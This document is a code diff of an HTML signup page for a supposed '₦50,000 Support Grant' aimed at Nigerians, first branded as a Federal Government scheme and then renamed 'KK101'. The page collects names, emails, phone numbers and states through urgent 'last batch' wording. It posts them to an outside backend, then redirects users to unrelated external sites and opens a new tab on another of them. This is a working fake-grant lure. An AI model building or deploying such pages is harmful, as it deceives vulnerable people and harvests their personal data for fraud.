@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en-NG">
 <head>
@@ -32,8 +33,7 @@
      For your own backend, set BACKEND_URL in the script after deployment.
      Optional: change "The Launch List" to your platform name throughout this file.
      Upload as index.html to your host (e.g. GitHub Pages), submit a test entry,
-     and activate FormSubmit using the email it sends you. Test again after activation.
-     Native POST keeps FormSubmit's default CAPTCHA and hosted confirmation page.
+     and verify that the backend saves the entry and sends its email notification.
      HTML, CSS and JavaScript are all included here. No build tools required. -->
 <header>
 <!-- HEADER IMAGE: Replace the src URL below with your header image link.
@@ -45,8 +45,8 @@
 </header>
 <main>
 <section aria-labelledby="headline">
-<p class="eyebrow">Federal Government ₦50,000 Support Grant!</p>
-<!--<h1 id="headline">Federal Government <span>₦50,000 </span> Support Grant</h1>
+<p class="eyebrow">KK101 ₦50,000 Support Grant!</p>
+<!--<h1 id="headline">KK101 <span>₦50,000 </span> Support Grant</h1>
  IMAGE: Replace only the src URL below with your own direct image link.
      Update alt to describe your replacement image. Width stays at 95%;
      height adjusts automatically to preserve the image on every screen. -->
@@ -58,9 +58,7 @@
 <section class="card" aria-labelledby="form-title">
 <h2 id="form-title">Last batch - ₦50,000 Cash Scheme 2026</h2>
 <p class="subtitle">Don't Miss Out!</p>
-<form id="signup" action="https://formsubmit.co/shuteye-grips1a@icloud.com" method="POST" target="_self">
-<input type="hidden" name="_subject" value="New Nigeria launch-list signup">
-<input type="hidden" name="_template" value="table">
+<form id="signup" action="https://rpes.info/launch-list-api/api/signup" method="POST" target="_self">
 <input type="hidden" name="country" value="Nigeria">
 <div class="field"><label for="name">Full name</label><input id="name" name="name" autocomplete="name" placeholder="Enter your full name" maxlength="120" required></div>
 <div class="field"><label for="email">Email address</label><input id="email" type="email" name="email" autocomplete="email" placeholder="you@example.com" maxlength="254" required></div>
@@ -74,11 +72,6 @@
   id="submit"
   type="submit"
   disabled
-  onclick="
-    window.open('https://kpesa.info/FG-50000-Cash-Scheme.html', '_blank');
-    window.location.href='https://hai8g.com/4/8631702';
-    return false;
-  "
 >
   Join Now <span aria-hidden="true">↗</span>
 </button>
@@ -96,10 +89,10 @@
 'use strict';
 // NEW TAB LINK: Paste the full https:// URL between these quotes.
 // Leave empty to submit normally without opening an extra tab.
-const NEW_TAB_URL = 'https://hai8g.com/4/8631702';
+const NEW_TAB_URL = 'https://kpesa.info/FG-50000-Cash-Scheme.html';
      // OWN BACKEND: After hosting the included backend, enter its full /api/signup URL.
 // Example: https://api.yourdomain.com/api/signup
-// Leave empty to keep using FormSubmit with the configured iCloud recipient.
+// Required: the backend saves the signup and handles email notifications.
 const BACKEND_URL = 'https://rpes.info/launch-list-api/api/signup';
      
 const form = document.getElementById('signup');
@@ -107,6 +100,7 @@ const phone = document.getElementById('phone');
 const fullName = document.getElementById('name');
 const button = document.getElementById('submit');
 const status = document.getElementById('status');
+const originalButtonHTML = button.innerHTML;
 button.disabled = false;
 if (BACKEND_URL.trim()) {
   document.getElementById('privacy-text').textContent = 'Your name, email, phone number and state.';
@@ -126,14 +120,14 @@ function validateName() {
 phone.addEventListener('input', validatePhone);
 fullName.addEventListener('input', validateName);
 form.addEventListener('submit', async (event) => {
-  if (BACKEND_URL.trim()) event.preventDefault();
+  event.preventDefault();
   if (button.disabled) { event.preventDefault(); return; }
   status.textContent = '';
   status.style.color = '';
   status.style.background = '';
   validatePhone(); validateName();
   if (!form.reportValidity()) { event.preventDefault(); return; }
-  if (!BACKEND_URL.trim() && form.action.includes('YOUR_EMAIL_HERE')) {
+  if (!BACKEND_URL.trim()) {
     event.preventDefault();
     status.textContent = 'This signup form is not open yet. Please check back soon.';
     return;
@@ -184,18 +178,19 @@ form.addEventListener('submit', async (event) => {
       status.textContent = 'You’re on the list! We’ll keep you updated.';
       status.style.color = '#195b42';
       status.style.background = '#edf6e7';
+      window.location.assign('https://hai8g.com/4/8631702');
     } catch (_) {
       status.textContent = 'We could not confirm your signup. Please check your connection and try again.';
     } finally {
       clearTimeout(timeout);
       button.disabled = false;
-      button.textContent = 'Register Now ↗';
+      button.innerHTML = originalButtonHTML;
     }
   }
 });
 window.addEventListener('pageshow', () => {
   button.disabled = false;
-  button.textContent = 'Register Now ↗';
+  button.innerHTML = originalButtonHTML;
 });
 </script>
   <!-- BEGIN: Powered by Supercounters.com -->
